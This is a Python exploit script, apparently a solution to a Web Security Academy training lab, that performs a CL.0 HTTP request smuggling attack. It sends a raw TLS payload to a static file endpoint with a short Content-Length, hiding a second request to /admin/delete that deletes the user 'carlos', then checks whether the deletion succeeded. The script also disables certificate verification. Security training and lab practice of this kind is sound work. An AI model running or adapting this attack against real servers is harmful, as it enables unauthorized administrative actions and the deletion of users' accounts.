import sys
import requests
import ssl
import socket
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy configuration for debugging (optional, can be removed in production)
proxie = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# CL.0 request smuggling attack function
def CL_0(target_host, target_port):
    # Smuggling payload designed to send two requests in a single TCP connection
    payload_smuggling = (
        "POST /resources/images/avatarDefault.svg HTTP/1.1\r\n"  # Vulnerable static file endpoint
        f"Host: {target_host}\r\n"  # Host header for the target
        "Content-Type: application/x-www-form-urlencoded\r\n"  # Standard content type
        "Connection: Keep-Alive\r\n"  # Keep-Alive to maintain the connection
        "Content-Length: 55\r\n"  # Content-Length set to only include part of the payload
        "\r\n"  # End of headers for the first request
        "GET /admin/delete?username=carlos HTTP/1.1\r\n"  # Smuggled request to delete user carlos
        "X-Ignore: x"  # Additional data to complete the payload
    )

    print('(+) Creating connection ....')

    # SSL context for secure connection
    ssl_context = ssl.create_default_context()
    with socket.create_connection((target_host, target_port)) as sock:
        with ssl_context.wrap_socket(sock, server_hostname=target_host) as secure_sock:
            print("(+) Sending payload .... ")

            # Sending the crafted payload
            secure_sock.sendall(payload_smuggling.encode())

            # Receiving the server's response
            response = secure_sock.recv(4096)

            # Checking if the payload succeeded
            if "HTTP/1.1 200 OK" in response.decode():
                response2 = requests.get("https://" + target_host, verify=False, proxies=proxie, allow_redirects=False)
                if response2.status_code == 302:
                    print('(+) User Deleted successfully.')
                    sys.exit()
                else:
                    print('(-) Unexpected Error ')
                    sys.exit()
            elif "504 Gateway Timeout" in response.decode():
                print("(-) No response received from the server.")
                sys.exit(1)
            else:
                print('(-) Unexpected Error ')

# Main function to handle user input and invoke the attack
def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Example %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net' % sys.argv[0])
        sys.exit(1)

    # Target host and port configuration
    target_host = sys.argv[1]
    target_port = 443

    # Execute the CL.0 request smuggling attack
    CL_0(target_host, target_port)

if __name__ == '__main__':
    main()
